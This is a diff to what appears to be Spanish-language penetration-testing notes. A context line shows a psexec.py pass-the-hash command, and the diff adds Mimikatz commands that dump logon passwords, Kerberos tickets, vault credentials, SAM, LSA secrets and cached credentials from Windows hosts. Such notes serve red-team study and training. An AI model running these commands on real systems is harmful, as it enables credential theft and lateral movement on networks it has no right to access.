@@ -85,11 +85,17 @@ psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:f58b86e89c8631e432cf1a023236
 ````bash
 privilege::debug
 
-[sekurlsa::logonpasswords
-
-sekurlsa::tickets
+sekurlsa::logonpasswords
+sekurlsa::tickets /export
 
 kerberos::list /export
+
+vault::cred
+vault::list
+
+lsadump::sam
+lsadump::secrets
+lsadump::cache
 ````
 
 Si por un casual no nos funcionara probar de esta forma, (importante)
